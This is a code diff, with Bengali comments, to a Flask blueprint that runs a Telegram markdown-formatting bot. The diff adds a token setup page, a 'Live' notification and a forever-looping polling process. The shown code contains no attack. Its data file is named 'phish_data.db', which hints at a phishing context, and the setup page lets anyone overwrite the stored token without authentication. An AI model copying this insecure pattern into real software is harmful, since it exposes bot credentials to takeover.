@@ -2,9 +2,9 @@ from flask import Blueprint, request, render_template_string
 import os
 import sqlite3
 import logging
-import threading
-import requests
 import time
+import requests
+from multiprocessing import Process
 
 # ========== লগিং সেটআপ ==========
 logging.basicConfig(level=logging.INFO)
@@ -13,7 +13,7 @@ logger = logging.getLogger(__name__)
 bp = Blueprint('md_bot', __name__, url_prefix='/bot')
 DB_PATH = '/tmp/phish_data.db'
 
-# ========== ডেটাবেস ফাংশন (টোকেন রাখার জন্য) ==========
+# ========== ডেটাবেস ফাংশন (টোকেন সংরক্ষণ) ==========
 def init_bot_table():
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
@@ -38,18 +38,14 @@ def set_token(new_token):
     conn.commit()
     conn.close()
 
-# ========== টোকেন সেভ হওয়ার সাথে সাথে "Live" মেসেজ পাঠানোর ফাংশন ==========
+# ========== টোকেন সেভ হওয়ার সাথে সাথে "Live" মেসেজ ==========
 def send_live_notification(token):
-    """সেভ করা টোকেন দিয়ে বটকে 'Live' মেসেজ পাঠানোর চেষ্টা করি"""
     try:
-        # ১. ইউজারের সবচেয়ে সাম্প্রতিক চ্যাট আইডি বের করি
         get_url = f"https://api.telegram.org/bot{token}/getUpdates"
         resp = requests.get(get_url, params={'limit': 1, 'offset': -1}, timeout=5)
         data = resp.json()
-        
         if data.get('ok') and data.get('result'):
             chat_id = data['result'][0]['message']['chat']['id']
-            # ২. ওই চ্যাটে মেসেজ পাঠাই
             send_url = f"https://api.telegram.org/bot{token}/sendMessage"
             payload = {
                 'chat_id': chat_id,
@@ -57,52 +53,40 @@ def send_live_notification(token):
                 'parse_mode': 'MarkdownV2'
             }
             requests.post(send_url, json=payload, timeout=5)
-            logger.info("✅ লাইভ নোটিফিকেশন সফলভাবে পাঠানো হয়েছে!")
-        else:
-            logger.info("ℹ️ কোনো পুরোনো চ্যাট পাওয়া যায়নি। ইউজার /start দিলে নোটিফিকেশন পাবে।")
-    except Exception as e:
-        logger.warning(f"⚠️ লাইভ নোটিফিকেশন পাঠাতে ব্যর্থ (ইউজার হয়তো এখনো বট ওপেন করেনি): {e}")
+            logger.info("✅ লাইভ নোটিফিকেশন পাঠানো হয়েছে!")
+    except:
+        logger.info("ℹ️ ইউজার হয়তো এখনো বট ওপেন করেনি।")
 
-# ========== ওয়েব সেটআপ পেজ (টোকেন দেওয়ার ফর্ম) ==========
+# ========== ওয়েব সেটআপ পেজ ==========
 @bp.route('/setup', methods=['GET', 'POST'])
 def setup():
     if request.method == 'POST':
         token = request.form.get('bot_token', '').strip()
         if not token:
             return render_template_string(ERROR_PAGE, msg="❌ টোকেন খালি রাখা যাবে না!")
-        
-        # টোকেন সেভ করো
         set_token(token)
-        
-        # 🔥 টোকেন সেভ হওয়ার সাথে সাথে "Live" মেসেজ পাঠানোর চেষ্টা করো
         send_live_notification(token)
-        
         return render_template_string(SUCCESS_PAGE, msg="✅ টোকেন সেভ হয়েছে! বট সক্রিয় হচ্ছে।", token=token[:10]+'...')
-    
     current_token = get_token()
     return render_template_string(SETUP_PAGE, has_token=bool(current_token))
 
-# ========== HTML টেমপ্লেট (সুন্দর ডার্ক থিম) ==========
+# ========== HTML টেমপ্লেট ==========
 SETUP_PAGE = '''
 <!DOCTYPE html>
-<html>
-<head><title>Cyber Tools MD - Setup</title></head>
-<body style="font-family:sans-serif;max-width:500px;margin:50px auto;padding:20px;background:#0d1117;color:#c9d1d9;border-radius:10px;">
+<html><body style="font-family:sans-serif;max-width:500px;margin:50px auto;padding:20px;background:#0d1117;color:#c9d1d9;border-radius:10px;">
 <h2 style="color:#58a6ff;">🛡️ Cyber Tools MD</h2>
 <h3>🤖 Bot Setup (Polling Mode)</h3>
-{% if has_token %}<p style="color:#3fb950;">✅ টোকেন সেভ আছে। নতুন দিতে চাইলে দিন:</p>
-{% else %}<p>@BotFather থেকে পাওয়া টোকেনটি দিন:</p>{% endif %}
+{% if has_token %}<p style="color:#3fb950;">✅ টোকেন সেভ আছে। নতুন দিতে চাইলে দিন:</p>{% endif %}
 <form method="post">
-<input type="text" name="bot_token" placeholder="যেমন: 7234567890:AAHdqTcv..." style="width:100%;padding:10px;margin:10px 0;background:#161b22;color:#fff;border:1px solid #30363d;border-radius:6px;">
+<input type="text" name="bot_token" placeholder="যেমন: 7234567890:AAHdqTcv..." style="width:100%;padding:10px;background:#161b22;color:#fff;border:1px solid #30363d;border-radius:6px;">
 <button type="submit" style="margin-top:10px;background:#238636;color:#fff;padding:10px 20px;border:0;border-radius:6px;cursor:pointer;">Save & Activate</button>
-</form>
-</body></html>
+</form></body></html>
 '''
 SUCCESS_PAGE = '''
 <!DOCTYPE html>
 <html><body style="font-family:sans-serif;max-width:500px;margin:50px auto;padding:20px;background:#0d1117;color:#c9d1d9;border-radius:10px;">
 <h2 style="color:#3fb950;">✅ Setup Complete!</h2><p>{{ msg }}</p><p>Token: <code>{{ token }}</code></p>
-<p>আপনার টেলিগ্রাম বটে এখন "Cyber MD Bot is live" মেসেজ চেক করুন।</p>
+<p>আপনার টেলিগ্রাম বটে "Live" মেসেজ চেক করুন।</p>
 <a href="/bot/setup" style="color:#58a6ff;">Go Back</a></body></html>
 '''
 ERROR_PAGE = '''
@@ -112,12 +96,12 @@ ERROR_PAGE = '''
 '''
 
 # ======================================================
-# ========== পোলিং বট (টেলিগ্রাম লাইব্রেরি) ==========
+# ========== পোলিং বট (সবচেয়ে শক্তিশালী ভার্সন) ==========
 # ======================================================
 try:
     from telegram import Update
     from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
-    
+
     # ----- অ্যাসিঙ্ক হ্যান্ডলারগুলো -----
     async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("""
@@ -176,44 +160,63 @@ Strike: `~text~`
     async def reply_all(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"আপনি লিখেছেন: _{update.message.text}_\n\nকমান্ড পেতে /start লিখুন।", parse_mode='MarkdownV2')
 
-    def run_polling():
-        """এটি আলাদা থ্রেডে চলে (ব্যাকগ্রাউন্ডে)"""
-        token = get_token()
-        if not token:
-            logger.warning("⛔ পোলিং শুরু হয়নি: টোকেন নেই। /bot/setup-এ গিয়ে সেট করুন।")
-            return
-        
-        logger.info("⏳ পোলিং বট শুরু হচ্ছে...")
-        app = Application.builder().token(token).build()
-        
-        app.add_handler(CommandHandler("start", start))
-        app.add_handler(CommandHandler("help", help))
-        app.add_handler(CommandHandler("bold", bold))
-        app.add_handler(CommandHandler("italic", italic))
-        app.add_handler(CommandHandler("code", code))
-        app.add_handler(CommandHandler("strike", strike))
-        app.add_handler(CommandHandler("echo", echo))
-        app.add_handler(CommandHandler("markdown", markdown))
-        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, reply_all))
-        
-        logger.info("✅ পোলিং চালু! বট এখন লাইভ। ইউজার /start দিলে রেসপন্স পাবে।")
-        app.run_polling(allowed_updates=Update.ALL_TYPES)
+    # ===== পোলিং ফাংশন (এটি আলাদা প্রসেসে চলে) =====
+    def run_polling_forever():
+        logger.info("🔄 পোলিং লুপ শুরু হয়েছে (প্রসেস আইডি: %s)", os.getpid())
+        while True:
+            token = get_token()
+            if not token:
+                logger.info("⏳ টোকেন নেই। ১০ সেকেন্ড পর আবার চেক করা হবে...")
+                time.sleep(10)
+                continue
 
-    # Flask অ্যাপ চালু হওয়ার সাথে সাথে পোলিং থ্রেড স্টার্ট করুন
-    threading.Thread(target=run_polling, daemon=True).start()
-    logger.info("🚀 অ্যাপ চালু হয়েছে। পোলিং থ্রেড স্টার্ট হচ্ছে...")
+            # 🔥 পুরোনো ওয়েবহুক জোর করে ডিলিট করো
+            try:
+                resp = requests.get(f"https://api.telegram.org/bot{token}/deleteWebhook", timeout=5)
+                if resp.json().get('ok'):
+                    logger.info("🔴 পুরোনো ওয়েবহুক ডিলিট করা হয়েছে।")
+                else:
+                    logger.warning(f"⚠️ ওয়েবহুক ডিলিট সমস্যা: {resp.text}")
+            except Exception as e:
+                logger.warning(f"ওয়েবহুক ডিলিট রিকোয়েস্ট ব্যর্থ: {e}")
+
+            logger.info("⏳ পোলিং বট কানেক্ট হচ্ছে...")
+            try:
+                app = Application.builder().token(token).build()
+                app.add_handler(CommandHandler("start", start))
+                app.add_handler(CommandHandler("help", help))
+                app.add_handler(CommandHandler("bold", bold))
+                app.add_handler(CommandHandler("italic", italic))
+                app.add_handler(CommandHandler("code", code))
+                app.add_handler(CommandHandler("strike", strike))
+                app.add_handler(CommandHandler("echo", echo))
+                app.add_handler(CommandHandler("markdown", markdown))
+                app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, reply_all))
+                
+                logger.info("✅ পোলিং চালু! বট এখন লাইভ।")
+                app.run_polling(allowed_updates=Update.ALL_TYPES)
+            except Exception as e:
+                logger.error(f"❌ পোলিং থেমে গেছে (ত্রুটি: {e}). ১০ সেকেন্ড পর আবার চেষ্টা করবে...")
+                time.sleep(10)
+                continue
+
+    # ===== অ্যাপ চালু হওয়ার সাথে সাথে পোলিং প্রসেস স্টার্ট করো =====
+    # এটি Flask এর main থ্রেডকে ব্লক করবে না
+    polling_process = Process(target=run_polling_forever, daemon=True)
+    polling_process.start()
+    logger.info("🚀 অ্যাপ চালু হয়েছে। পোলিং প্রসেস স্টার্ট হয়েছে (PID: %s)", polling_process.pid)
 
 except ImportError:
-    logger.error("❌ 'python-telegram-bot' প্যাকেজ ইনস্টল নেই! requirements.txt-এ এটি যোগ করুন।")
+    logger.error("❌ 'python-telegram-bot' প্যাকেজ ইনস্টল নেই! requirements.txt চেক করুন।")
 
 # ======================================================
 # ========== md_tools ফোল্ডার থেকে টুলস লোড ==========
 # ======================================================
 try:
     from md_tools import preview, converter, formatter
-    bp.register_blueprint(preview.bp)      # URL: /bot/md/preview
-    bp.register_blueprint(converter.bp)    # URL: /bot/md/convert
-    bp.register_blueprint(formatter.bp)    # URL: /bot/md/format
+    bp.register_blueprint(preview.bp)
+    bp.register_blueprint(converter.bp)
+    bp.register_blueprint(formatter.bp)
     logger.info("✅ md_tools ব্লুপ্রিন্ট সফলভাবে রেজিস্টার হয়েছে")
 except ImportError as e:
-    logger.warning(f"⚠️ md_tools ফোল্ডার পাওয়া যায়নি বা লোড হয়নি: {e}")
+    logger.warning(f"⚠️ md_tools ফোল্ডার পাওয়া যায়নি: {e}")
